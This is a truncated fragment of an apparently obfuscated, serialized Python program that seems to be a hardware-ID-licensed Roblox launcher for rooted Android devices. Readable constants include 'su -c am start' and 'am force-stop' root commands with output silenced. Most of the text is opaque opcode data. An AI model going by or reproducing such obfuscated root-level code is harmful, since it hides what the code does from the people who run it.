'strip', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 202, 107, 202, 4, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [60], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 91, 89, 72, 76, 78, 83, 28, 88, 73, 95, 81, 80, '_', 'sha256', 'encode', 'hexdigest'], 'FcvQsFUf_U4XrAs9K': ['subprocess', 'map', 'gMsCUQhr_WbZO4DqK', 'GPcucNQO_hOTPVSNF', 'str', 'txPEVxAN_XJZiReFx', 'hashlib', 'yLDzPgSQ_YOjf8i3w'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 29, 255, 35, 0, 130, 0, 190, 1, 10, 180, 29, 248, 156, 0, 232, 80, 130, 0, 125, 138, 190, 0, 59, 0, 10, 135, 232, 27, 130, 1, 247, 0, 202, 209, 35, 2, 202, 5, 130, 3, 202, 66, 190, 2, 89, 3, 29, 5, 125, 112, 190, 4, 202, 49, 130, 4, 130, 2, 202, 120, 247, 1, 253, 2, 202, 97, 125, 174, 92, 1, 247, 1, 202, 187, 202, 151, 111, 0, 29, 164, 202, 103, 190, 5, 35, 0, 184, 79, 130, 0, 190, 5, 59, 0, 29, 155, 232, 79, 130, 2, 125, 225, 130, 5, 10, 146, 125, 242, 234, 0, 232, 77, 130, 3, 190, 2, 29, 202, 89, 3, 10, 139, 130, 6, 190, 6, 202, 66, 202, 233, 233, 0, 190, 7, 10, 219, 29, 65, 190, 8, 190, 9, 190, 10, 190, 11, 125, 150, 190, 12, 190, 13, 190, 14, 190, 12, 190, 15, 190, 8, 190, 16, 190, 17, 202, 80, 29, 174, 190, 12, 10, 32, 10, 155, 190, 18, 29, 255, 190, 16, 190, 19, 190, 15, 190, 12, 125, 52, 125, 148, 190, 15, 202, 61, 190, 20, 190, 21, 10, 177, 190, 12, 125, 228, 190, 21, 29, 211, 29, 57, 190, 8, 190, 22, 190, 21, 202, 251, 190, 23, 253, 28, 247, 2, 92, 1, 29, 250, 125, 116, 247, 1, 29, 74, 10, 252, 111, 0, 130, 7, 247, 0, 111, 0, 190, 1, 35, 0, 184, 2, 165, 0], 'NbmLvVPl_QHrSn5Af': [224, 96, '', 'join', 'HWID của bạn: ', 133, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 89, 202, 5, 130, 0, 80, 0, 10, 97, 190, 0, 199, 0, 125, 90, 10, 237, 247, 1, 10, 191, 202, 180, 149, 0], 'NbmLvVPl_QHrSn5Af': [107], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 63, 3, 2, 7892, 31, 75, 9, 7840, 8, 475, 10, 378, 7816, 7886, 27, 130, 69], 'FcvQsFUf_U4XrAs9K': ['jeaeYzVX_LBvsPCp7', 'cqeyTKeO_EIO5scZ0', 'yLDzPgSQ_YOjf8i3w', 'print', 'str', 'SEDsaGYM_jXRfBvRw', 'map', 'exit'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 253, 190, 0, 35, 0, 125, 81, 10, 165, 130, 0, 190, 1, 156, 0, 232, 53, 130, 0, 190, 0, 59, 0, 232, 223, 202, 45, 130, 1, 190, 2, 89, 3, 130, 2, 125, 71, 202, 95, 190, 4, 202, 200, 233, 0, 10, 248, 190, 5, 29, 80, 202, 54, 190, 6, 190, 7, 190, 8, 190, 9, 10, 208, 190, 5, 10, 71, 190, 10, 202, 78, 125, 189, 190, 11, 125, 61, 190, 12, 190, 8, 190, 13, 29, 248, 190, 9, 190, 6, 190, 11, 29, 245, 190, 14, 190, 8, 190, 9, 202, 32, 190, 13, 190, 15, 190, 11, 190, 9, 190, 16, 190, 17, 10, 9, 190, 18, 190, 9, 29, 196, 202, 76, 190, 19, 29, 242, 190, 15, 125, 145, 10, 75, 190, 8, 29, 46, 29, 165, 190, 20, 190, 21, 125, 192, 253, 30, 247, 2, 10, 54, 92, 1, 247, 1, 29, 63, 111, 0, 125, 118, 130, 1, 125, 97, 190, 2, 89, 3, 130, 2, 190, 22, 125, 137, 233, 0, 29, 145, 29, 82, 190, 23, 202, 23, 202, 149, 190, 6, 190, 24, 190, 25, 190, 26, 125, 0, 190, 27, 190, 28, 202, 130, 202, 64, 190, 29, 190, 24, 190, 30, 125, 76, 10, 222, 253, 10, 247, 2, 92, 1, 247, 1, 111, 0, 130, 1, 190, 2, 29, 135, 125, 211, 89, 3, 130, 2, 190, 31, 233, 0, 190, 32, 125, 252, 190, 33, 202, 34, 190, 34, 190, 35, 190, 36, 190, 37, 190, 38, 190, 34, 202, 46, 190, 18, 253, 9, 247, 2, 92, 1, 247, 1, 125, 99, 10, 93, 111, 0, 10, 188, 202, 194, 130, 1, 29, 48, 10, 35, 190, 2, 125, 14, 10, 14, 89, 3, 125, 93, 202, 42, 130, 2, 190, 39, 233, 0, 202, 125, 10, 255, 190, 40, 190, 41, 29, 158, 190, 42, 202, 37, 202, 170, 190, 43, 29, 106, 190, 44, 190, 45, 190, 46, 190, 32, 125, 185, 202, 235, 190, 47, 190, 42, 190, 48, 202, 67, 190, 13, 202, 134, 253, 12, 202, 81, 202, 148, 247, 2, 92, 1, 247, 1, 125, 31, 111, 0, 125, 67, 10, 152, 130, 3, 10, 12, 202, 237, 190, 2, 89, 3, 130, 2, 29, 73, 190, 49, 125, 188, 233, 0, 10, 73, 202, 237, 190, 50, 29, 197, 125, 78, 190, 51, 190, 52, 29, 2, 10, 41, 190, 53, 190, 33, 190, 54, 190, 55, 10, 125, 202, 139, 190, 36, 190, 33, 29, 19, 29, 75, 190, 56, 190, 51, 125, 167, 190, 57, 10, 30, 125, 41, 190, 58, 190, 33, 190, 47, 190, 33, 125, 130, 125, 139, 253, 16, 202, 103, 247, 2, 92, 1, 247, 1, 89, 59, 92, 0, 125, 153, 202, 190, 35, 4, 190, 2, 29, 97, 89, 3, 29, 215, 202, 182, 130, 2, 190, 60, 233, 0, 125, 126, 125, 94, 190, 33, 29, 148, 29, 101, 253, 1, 247, 2, 92, 1, 125, 17, 125, 174, 190, 2, 89, 3, 130, 2, 202, 175, 190, 61, 202, 240, 29, 170, 233, 0, 190, 62, 29, 185, 202, 88, 190, 16, 202, 107, 29, 43, 190, 63, 10, 130, 190, 64, 190, 65, 125, 116, 253, 5, 247, 2, 202, 236, 125, 105, 92, 1, 29, 35, 190, 2, 10, 138, 89, 3, 10, 77, 29, 54, 130, 2, 125, 67, 190, 66, 125, 88, 233, 0, 190, 58, 125, 81, 253, 1, 247, 2, 92, 1, 190, 2, 202, 126, 89, 3, 130, 2, 202, 190, 202, 15, 190, 67, 125, 133, 233, 0, 190, 68, 190, 69, 10, 193, 202, 153, 190, 13, 190, 70, 190, 6, 125, 254, 253, 5, 247, 2, 92, 1, 10, 210, 190, 2, 125, 62, 202, 185, 89, 3, 130, 2, 10, 176, 190, 71, 233, 0, 202, 187, 29, 34, 190, 28, 202, 187, 202, 124, 253, 1, 247, 2, 125, 197, 29, 246, 92, 1, 29, 71, 29, 13, 190, 2, 29, 239, 89, 3, 125, 141, 202, 210, 130, 2, 190, 72, 233, 0, 202, 40, 125, 156, 190, 73, 125, 118, 190, 74, 190, 20, 190, 75, 190, 76, 190, 27, 190, 50, 190, 77, 253, 8, 247, 2, 92, 1, 10, 83, 115, 3, 202, 217, 35, 5, 130, 5, 89, 78, 202, 21, 130, 4, 92, 1, 202, 114, 35, 6, 190, 47, 35, 0, 10, 136, 29, 79, 184, 52, 130, 0, 190, 47, 59, 0, 10, 177, 202, 77, 232, 46, 202, 74, 202, 189, 130, 6, 190, 79, 10, 142, 10, 213, 54, 0, 232, 43, 130, 1, 190, 2, 89, 3, 130, 2, 190, 80, 233, 0, 190, 25, 190, 81, 29, 60, 190, 82, 10, 115, 29, 155, 190, 8, 190, 83, 125, 91, 10, 134, 190, 48, 190, 84, 190, 9, 10, 53, 29, 159, 190, 8, 125, 18, 190, 85, 190, 48, 190, 86, 190, 9, 202, 46, 190, 87, 202, 34, 190, 8, 190, 48, 190, 88, 190, 89, 29, 121, 190, 8, 29, 196, 202, 243, 190, 90, 29, 223, 190, 91, 190, 19, 202, 27, 190, 8, 10, 173, 190, 26, 202, 207, 190, 92, 190, 83, 202, 112, 190, 8, 10, 189, 202, 240, 190, 93, 190, 94, 190, 9, 190, 48, 190, 8, 190, 83, 190, 48, 190, 84, 29, 104, 125, 219, 190, 9, 190, 13, 202, 64, 190, 8, 125, 192, 10, 197, 190, 21, 190, 74, 29, 59, 10, 48, 190, 90, 190, 20, 190, 82, 253, 43, 247, 2, 92, 1, 202, 57, 247, 1, 111, 0, 29, 121, 125, 191, 190, 2, 89, 3, 10, 137, 130, 2, 29, 208, 190, 95, 233, 0, 190, 96, 190, 87, 29, 191, 29, 44, 190, 9, 190, 97, 202, 218, 190, 83, 253, 5, 10, 237, 247, 2, 92, 1, 35, 6, 190, 98, 29, 160, 35, 0, 184, 52, 10, 119, 130, 0, 190, 98, 59, 0, 232, 52, 130, 6, 10, 193, 125, 239, 149, 0, 184, 2, 29, 171, 165, 0], 'NbmLvVPl_QHrSn5Af': [178, 187, '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [96], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 35, 8, 7853, 14, 64, 12, 9, 5, 20, 7847, 7873, 3, 7815, 1, 2, 90, 106, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 171, 130, 0, 202, 205, 80, 0, 29, 155, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [38], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 23, 6, 98, 67, 74, 82, 71, 126, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 101, 29, 91, 130, 0, 29, 227, 125, 140, 80, 0, 190, 0, 199, 0, 125, 33, 10, 93, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [89], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 107, 119, 121, 26, 54, 61, 60, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 202, 51, 125, 50, 247, 1, 202, 208, 149, 0], 'NbmLvVPl_QHrSn5Af': [30], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 45, 48, 62, 95, 108, 125, 123, 109, 70, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 59, 80, 0, 190, 0, 199, 0, 247, 1, 125, 252, 125, 34, 149, 0], 'NbmLvVPl_QHrSn5Af': [87], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 25, 63, 7930, 39, 59, 7846, 52, 7834, 57, 'strip', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 86, 190, 0, 199, 0, 247, 1, 29, 216, 29, 84, 149, 0], 'NbmLvVPl_QHrSn5Af': [70], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 5, 130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 29, 196, 149, 0], 'NbmLvVPl_QHrSn5Af': [102], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 34, 10, 18, 7, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 251, 125, 132, 190, 0, 29, 109, 125, 177, 199, 0, 10, 144, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [11], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 208, 130, 0, 202, 117, 80, 0, 125, 3, 190, 0, 199, 0, 29, 99, 10, 225, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [112], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 51, 31, 21, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 25, 130, 0, 80, 0, 190, 0, 202, 232, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [97], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 198, 125, 130, 130, 0, 80, 0, 190, 0, 202, 213, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [57], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 120, 75, 92, 76, 97, 'get', None, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 157, 80, 0, 190, 0, 10, 34, 10, 143, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [46], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 7903, 79, 77, 7907, 69, 218, 73, 7885, 94, 66, 7913, 7833, 319, 7909, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 29, 104, 202, 86, 149, 0], 'NbmLvVPl_QHrSn5Af': [44], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 104, 88, 151], 'FcvQsFUf_U4XrAs9K': ['OGVpKsnN_vNcZiCOQ', 'print', 'map', 'input', 'SPOanHfV_TEqSjaRw', 'YLiXWxSS_rENEJzD2', 'xxSIwbGF_Ccx40LJx'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 210, 10, 26, 190, 0, 35, 0, 130, 0, 190, 1, 10, 63, 156, 0, 232, 58, 130, 0, 190, 0, 59, 0, 232, 19, 202, 74, 29, 95, 130, 1, 29, 78, 130, 2, 89, 2, 92, 0, 247, 1, 35, 3, 190, 3, 29, 106, 35, 0, 184, 57, 130, 0, 125, 66, 190, 3, 59, 0, 10, 128, 10, 68, 232, 49, 130, 4, 202, 58, 48, 4, 202, 223, 125, 5, 89, 5, 125, 25, 125, 230, 80, 0, 92, 1, 125, 247, 78, 0, 232, 46, 130, 4, 89, 6, 130, 4, 29, 170, 10, 222, 48, 4, 89, 7, 80, 0, 125, 35, 92, 1, 190, 8, 29, 51, 190, 9, 115, 1, 202, 130, 1, 1, 202, 193, 111, 0, 202, 99, 190, 10, 111, 0, 130, 3, 149, 0, 190, 11, 35, 0, 184, 57, 130, 0, 190, 11, 59, 0, 232, 57, 190, 10, 29, 231, 111, 0, 29, 71, 10, 156, 190, 1, 125, 143, 10, 104, 35, 0, 184, 2, 165, 0], 'NbmLvVPl_QHrSn5Af': [126, 105, 'time', 25, 'path', 'exists', 'makedirs', 'dirname', 'exist_ok', True, None, 191], 'FcvQsFUf_U4XrAs9K': ['iRcrWDKt_hH7tmPXr', 'int', 'time', 'bShStDUr_RWtgMU4m', 'os'], 'fhuctOnk_99WtMbd3': ['filename'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [125, 81, 29, 161, 190, 0, 10, 103, 35, 0, 130, 0, 190, 1, 156, 0, 10, 43, 232, 107, 29, 45, 130, 0, 29, 25, 190, 0, 29, 243, 59, 0, 202, 25, 29, 245, 232, 57, 29, 232, 202, 48, 130, 1, 89, 2, 125, 241, 190, 3, 89, 4, 130, 2, 10, 101, 202, 59, 190, 5, 29, 3, 233, 0, 29, 154, 190, 6, 10, 81, 190, 7, 190, 8, 125, 167, 190, 9, 190, 10, 190, 11, 190, 12, 202, 211, 190, 8, 202, 231, 190, 6, 190, 13, 190, 14, 10, 188, 190, 15, 190, 13, 190, 16, 190, 17, 125, 241, 190, 11, 125, 124, 190, 8, 190, 0, 29, 83, 190, 8, 190, 16, 10, 205, 190, 18, 190, 17, 190, 6, 125, 194, 190, 8, 125, 192, 202, 123, 190, 18, 190, 19, 190, 20, 10, 139, 10, 232, 190, 9, 29, 191, 190, 19, 190, 21, 125, 102, 253, 30, 247, 2, 92, 1, 92, 1, 29, 153, 89, 22, 92, 0, 29, 81, 202, 133, 35, 3, 29, 12, 190, 23, 35, 0, 184, 106, 130, 0, 190, 23, 202, 135, 59, 0, 232, 106, 125, 225, 130, 3, 89, 24, 92, 0, 160, 0, 246, 104, 35, 4, 130, 4, 89, 25, 190, 3, 10, 51, 89, 4, 130, 2, 190, 26, 125, 218, 233, 0, 190, 27, 190, 28, 190, 20, 190, 29, 29, 85, 29, 111, 190, 28, 190, 30, 29, 190, 190, 31, 190, 32, 253, 8, 29, 152, 247, 2, 10, 213, 202, 252, 92, 1, 190, 3, 92, 2, 202, 151, 10, 200, 89, 33, 92, 0, 10, 60, 125, 147, 35, 5, 125, 253, 202, 48, 130, 1, 89, 34, 10, 160, 190, 3, 89, 4, 190, 35, 130, 6, 10, 136, 130, 5, 247, 1, 125, 97, 190, 36, 253, 3, 92, 1, 92, 1, 111, 0, 184, 65, 202, 246, 190, 1, 35, 0, 29, 115, 202, 20, 184, 2, 202, 152, 165, 0], 'NbmLvVPl_QHrSn5Af': [106, 231, 'popen', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [125, 253, 125, 123, 130, 0, 29, 241, 80, 0, 190, 0, 29, 55, 199, 0, 247, 1, 202, 247, 202, 97, 149, 0], 'NbmLvVPl_QHrSn5Af': [22], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 102, 123, 54, 122, 127, 101, 98, 119, 117, 125, 113, 115, 100, 121, 116, 110, 'read', 217, 'splitlines', 'replace', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 148, 125, 1, 190, 0, 199, 0, 29, 170, 247, 1, 29, 105, 149, 0], 'NbmLvVPl_QHrSn5Af': [23], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 103, 118, 124, 112, 114, 45, 'strip', 'system', "su -c 'am force-stop ", "'"], 'FcvQsFUf_U4XrAs9K': ['EWXHTyKr_jT83NVQK', 'os', 'map', 'DZkAuMZf_z92iPe3H', 'LhfACvQj_Zy5g0PQs', 'wfIRruUo_JoYp9YEy', 'str'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 29, 100, 130, 0, 29, 230, 190, 1, 10, 253, 156, 0, 232, 129, 10, 192, 125, 217, 130, 0, 190, 0, 59, 0, 10, 195, 232, 61, 130, 1, 29, 181, 89, 2, 202, 217, 190, 3, 89, 4, 130, 2, 10, 77, 10, 238, 190, 5, 233, 0, 29, 167, 190, 6, 29, 194, 10, 38, 190, 7, 190, 8, 10, 152, 125, 161, 190, 9, 125, 137, 29, 163, 190, 10, 190, 11, 190, 12, 190, 8, 29, 95, 10, 88, 190, 6, 190, 13, 125, 35, 190, 14, 190, 15, 190, 13, 190, 16, 190, 17, 190, 11, 190, 8, 190, 18, 190, 8, 190, 16, 190, 19, 10, 250, 10, 206, 190, 17, 190, 6, 125, 249, 10, 148, 190, 8, 202, 17, 29, 28, 190, 19, 125, 227, 125, 160, 190, 20, 29, 12, 202, 81, 190, 21, 190, 9, 190, 20, 125, 194, 190, 22, 253, 30, 10, 181, 247, 2, 10, 86, 125, 62, 92, 1, 202, 83, 10, 172, 92, 1, 89, 23, 10, 88, 92, 0, 89, 24, 202, 125, 92, 0, 35, 3, 253, 0, 35, 4, 125, 253, 29, 8, 190, 25, 35, 0, 184, 128, 130, 0, 125, 185, 190, 25, 59, 0, 29, 149, 29, 80, 232, 122, 130, 3, 89, 26, 202, 224, 125, 238, 92, 0, 202, 162, 125, 29, 160, 0, 246, 119, 29, 165, 29, 104, 35, 5, 10, 144, 125, 187, 190, 3, 125, 80, 89, 4, 10, 193, 130, 2, 190, 27, 29, 69, 233, 0, 202, 93, 29, 207, 190, 28, 29, 77, 190, 29, 125, 117, 190, 30, 190, 31, 190, 29, 10, 7, 10, 234, 190, 32, 190, 33, 125, 212, 29, 80, 190, 17, 125, 249, 253, 8, 247, 2, 92, 1, 130, 5, 125, 60, 245, 0, 232, 118, 130, 5, 29, 204, 89, 34, 10, 192, 202, 215, 190, 3, 89, 4, 130, 2, 125, 230, 190, 35, 233, 0, 190, 6, 190, 13, 190, 14, 125, 19, 10, 35, 190, 15, 190, 13, 190, 16, 190, 17, 190, 33, 253, 8, 10, 191, 29, 73, 247, 2, 92, 1, 125, 45, 190, 3, 92, 2, 89, 24, 92, 0, 29, 198, 29, 159, 35, 6, 130, 4, 89, 36, 202, 239, 202, 216, 130, 6, 92, 1, 111, 0, 29, 146, 29, 35, 184, 69, 190, 37, 35, 0, 184, 128, 130, 0, 190, 37, 59, 0, 125, 93, 232, 128, 130, 4, 149, 0, 10, 230, 184, 2, 125, 121, 165, 0], 'NbmLvVPl_QHrSn5Af': [219, 208, 'popen', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 125, 81, 125, 231, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [16], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 96, 125, 48, 124, 121, 99, 100, 113, 115, 123, 119, 117, 108, 98, 127, 114, 104, 'read', 'strip', 239, 'splitlines', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 135, 29, 149, 80, 0, 190, 0, 199, 0, 125, 118, 247, 1, 125, 26, 10, 145, 149, 0], 'NbmLvVPl_QHrSn5Af': [79], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 63, 46, 44, 36, 40, 42, 'replace', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 29, 130, 10, 149, 199, 0, 247, 1, 202, 58, 149, 0], 'NbmLvVPl_QHrSn5Af': [16], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 'append', 159], 'FcvQsFUf_U4XrAs9K': ['EdNMbKZh_cFib98ce', 'os', 'map', 'DZkAuMZf_z92iPe3H', 'ysLHnjOS_IkcNJIGj', 'LhfACvQj_Zy5g0PQs', 'wfIRruUo_JoYp9YEy'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 95, 202, 40, 190, 0, 35, 0, 125, 26, 130, 0, 190, 1, 156, 0, 232, 78, 130, 0, 190, 0, 59, 0, 232, 49, 190, 2, 89, 3, 29, 82, 190, 4, 125, 201, 130, 1, 80, 0, 247, 1, 253, 2, 92, 1, 35, 2, 202, 143, 202, 227, 130, 3, 190, 2, 89, 3, 130, 4, 202, 186, 125, 238, 190, 5, 29, 6, 125, 74, 233, 0, 125, 21, 10, 202, 190, 6, 202, 158, 29, 136, 190, 7, 190, 8, 190, 9, 190, 10, 10, 102, 202, 79, 190, 11, 190, 12, 190, 10, 202, 100, 125, 40, 190, 9, 10, 171, 190, 7, 202, 21, 190, 11, 10, 104, 190, 13, 190, 14, 29, 53, 10, 102, 253, 13, 29, 202, 247, 2, 92, 1, 247, 1, 125, 85, 125, 190, 111, 0, 130, 5, 247, 0, 35, 6, 190, 15, 202, 22, 35, 0, 29, 26, 184, 77, 130, 0, 10, 188, 125, 114, 190, 15, 29, 167, 59, 0, 125, 170, 232, 77, 202, 89, 130, 6, 202, 26, 160, 0, 125, 169, 202, 181, 246, 75, 10, 199, 35, 7, 130, 8, 89, 16, 190, 2, 89, 3, 190, 17, 130, 1, 130, 7, 247, 1, 125, 183, 190, 18, 130, 1, 130, 2, 247, 1, 190, 19, 29, 242, 253, 5, 92, 1, 92, 1, 125, 225, 125, 43, 111, 0, 29, 37, 125, 43, 184, 55, 29, 12, 190, 1, 125, 247, 202, 98, 35, 0, 184, 2, 10, 84, 165, 0], 'NbmLvVPl_QHrSn5Af': [90, 23, '', 'join', 'roblox://placeId=', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 29, 29, 29, 175, 80, 0, 202, 227, 10, 235, 190, 0, 202, 38, 199, 0, 247, 1, 125, 61, 149, 0], 'NbmLvVPl_QHrSn5Af': [41], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 313, 72, 71, 78, 9, 68, 7926, 76, 19, 46, 'system', "su -c 'am start -n ", '/com.roblox.client.ActivityProtocolLaunch -d "', '"\' > /dev/null 2>&1'], 'FcvQsFUf_U4XrAs9K': ['GXAYOVNF_I2j6uQaU', 'str', 'zKMkhjYh_LV5z1XIb', 'print', 'map', 'iVbjOCPF_aEawyRGV', 'ysLHnjOS_IkcNJIGj', 'wfIRruUo_JoYp9YEy', 'os'], 'fhuctOnk_99WtMbd3': ['place_id'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 130, 0, 190, 1, 29, 187, 125, 173, 156, 0, 232, 54, 130, 0, 190, 0, 10, 195, 59, 0, 232, 17, 29, 46, 125, 171, 130, 1, 125, 128, 80, 0, 247, 1, 35, 2, 190, 2, 10, 102, 29, 158, 35, 0, 184, 53, 130, 0, 190, 2, 59, 0, 232, 30, 10, 81, 130, 2, 190, 3, 125, 228, 29, 16, 59, 0, 125, 249, 232, 27, 29, 145, 190, 4, 149, 0, 10, 91, 190, 5, 35, 0, 184, 53, 29, 211, 130, 0, 29, 63, 190, 5, 202, 202, 10, 255, 59, 0, 232, 43, 130, 3, 29, 112, 130, 4, 89, 6, 92, 0, 10, 163, 10, 176, 247, 1, 10, 2, 10, 216, 35, 5, 190, 7, 202, 107, 10, 190, 35, 0, 184, 53, 130, 0, 29, 100, 125, 10, 190, 7, 10, 153, 59, 0, 125, 94, 232, 53, 10, 141, 29, 220, 130, 5, 130, 2, 125, 219, 125, 201, 24, 0, 190, 8, 202, 85, 171, 0, 149, 0, 10, 152, 184, 2, 29, 45, 165, 0], 'NbmLvVPl_QHrSn5Af': [176, 225, 217, 0, False, 57, 'time', 108, 90], 'FcvQsFUf_U4XrAs9K': ['cyfbZpwH_oFMWJ1bw', 'lyVHsuav_kRoCOnsk', 'siLxZRCv_stRAxO6u', 'int', 'time', 'bShStDUr_RWtgMU4m'], 'fhuctOnk_99WtMbd3': ['file_path'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 35, 0, 202, 140, 130, 0, 190, 1, 10, 114, 29, 47, 156, 0, 125, 226, 232, 214, 202, 20, 130, 0, 29, 184, 125, 111, 190, 0, 125, 108, 10, 46, 59, 0, 29, 179, 232, 145, 130, 1, 202, 150, 247, 0, 111, 0, 130, 2, 247, 0, 35, 3, 125, 230, 130, 4, 190, 2, 89, 3, 190, 4, 29, 21, 10, 6, 130, 5, 130, 3, 202, 235, 29, 242, 247, 1, 190, 5, 253, 3, 92, 1, 247, 1, 111, 0, 125, 55, 190, 2, 202, 109, 89, 3, 10, 216, 130, 6, 29, 134, 190, 6, 29, 185, 233, 0, 202, 173, 190, 7, 190, 7, 29, 52, 125, 66, 190, 8, 29, 141, 